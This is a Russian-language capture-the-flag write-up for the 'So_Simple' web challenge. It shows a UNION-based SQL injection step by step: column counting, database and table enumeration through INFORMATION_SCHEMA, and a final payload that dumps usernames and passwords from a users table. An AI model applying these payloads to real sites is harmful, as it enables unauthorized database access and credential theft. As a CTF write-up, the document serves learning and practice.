# So_Simple (173 points, 300 solves)

> "Try Harder" may be You get flag manually
>
> Try id as parameter
>
> http://web.darkarmy.xyz:30001

Аналогично [прошлому](../Simple_SQL) заданию, я перебирал различные `id` и [8](http://web.darkarmy.xyz:30001/?id=8)
казалось бы приводит к успеху...

![](https://i.imgur.com/jyrPOI7.png)

Однако это ненастоящий флаг. Неужели пришло время SQL-инъекций? Проверяем [http://web.darkarmy.xyz:30001/?id=8'](http://web.darkarmy.xyz:30001/?id=8%27):

![](https://i.imgur.com/AyIrrjj.png)

Спасибо ребятам за жёлтый цвет текста на белом фоне, даже выделить пришлось. Но мы получили ошибку! Значит можно 
разгуляться.

Я с подобным типом атак знаком слабо, но помню, что была интересная с `UNION`. В интернете нашёл очень хорошую
[статью](https://codeby.net/threads/sql-injection-nachalo-union-based.68720/) с примерами и просто следовал ей. Кратко 
опишу шаги:
1. Находим количество колонок: 
[http://web.darkarmy.xyz:30001/?id=8' UNION SELECT 1 -- 123](http://web.darkarmy.xyz:30001/?id=8%27%20UNION%20SELECT%201%20--%20123)
```
 The used SELECT statements have a different number of columns 
```
[http://web.darkarmy.xyz:30001/?id=8' UNION SELECT 1,2,3 -- 123](http://web.darkarmy.xyz:30001/?id=8%27%20UNION%20SELECT%201,2,3%20--%20123) -
нет ошибки.
2. Находим имя БД (меняем id на несуществующий, чтобы убрать результаты запроса до `UNION`):
[http://web.darkarmy.xyz:30001/?id=-8' UNION SELECT 1,database(),3 -- 123](http://web.darkarmy.xyz:30001/?id=-8%27%20UNION%20SELECT%201,database(),3%20--%20123)
```
Your Login name:id14831952_security
```
3. Смотрим, какие есть таблицы:
[http://web.darkarmy.xyz:30001/?id=-8' UNION SELECT 1,table_name,3 from INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=database() limit 0,1 -- -](http://web.darkarmy.xyz:30001/?id=-8%27%20UNION%20SELECT%201,table_name,3%20from%20INFORMATION_SCHEMA.TABLES%20WHERE%20TABLE_SCHEMA=database()%20limit%200,1%20--%20-)
Меняя значения в `LIMIT`, выясняем, что есть следующие таблицы: `emails`, `referers`, `uagents`, `users`.
Последняя выглядит интересно, надо посмотреть, что в ней.
4. Смотрим, какие есть колонки:
[http://web.darkarmy.xyz:30001/?id=-8' UNION SELECT 1,column_name,3 from information_schema.columns where table_name='users' limit 0,1 -- -](http://web.darkarmy.xyz:30001/?id=-8%27%20UNION%20SELECT%201,column_name,3%20from%20information_schema.columns%20where%20table_name=%27users%27%20limit%200,1%20--%20-)
Аналогично находим: `id`, `username`, `password`, `USER`, `CURRENT_CONNECTIONS`, `TOTAL_CONNECTIONS`.
Посмотрим, что лежит в имени и пароле.
5. Смотрим данные в `username` и `password`:
[http://web.darkarmy.xyz:30001/?id=-8' union select 1,password,username from users limit 8,1 -- -](http://web.darkarmy.xyz:30001/?id=-8%27%20union%20select%201,password,username%20from%20users%20limit%208,1%20--%20-)

![](https://i.imgur.com/EH3AaTN.png)

Бинго!